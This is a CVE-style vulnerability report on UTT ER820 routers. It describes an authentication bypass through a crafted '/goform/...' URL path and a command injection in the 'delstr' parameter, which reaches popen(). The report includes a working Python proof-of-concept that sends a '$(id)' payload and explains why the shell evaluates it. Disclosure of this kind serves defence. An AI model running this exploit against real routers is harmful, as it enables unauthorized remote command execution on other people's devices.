# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formFtpServerDirDel / sub_47FE40)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formFtpServerDirDel` (mapped to function `sub_47FE40`, range `0x47feb8-0x480030`) which can be reached via an authentication bypass, and then abused for command injection. The handler uses user-controlled `delstr` values in a shell command executed via `popen()`, enabling remote command execution.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/formFtpServerDirDel/goform/formWebAuthUserSubmit'
    data = {
        'delstr': '$(id)'
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: `websSecurityHandler` routes requests containing `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` directly into `websFormHandler`. A crafted URL `/goform/formFtpServerDirDel/goform/formWebAuthUserSubmit` can bypass authentication.

2. **command injection**: In `sub_47FE40`, the parameter `delstr` is retrieved via `websGetVar` and split by `,`. Each token `i` is embedded into the command `umount "/ftpRoot/%s" ...; echo $?` using `sprintf`, and executed via `popen(...)`. Because `$()` is evaluated by the shell even inside double quotes, a payload like `$(id)` results in arbitrary command execution.
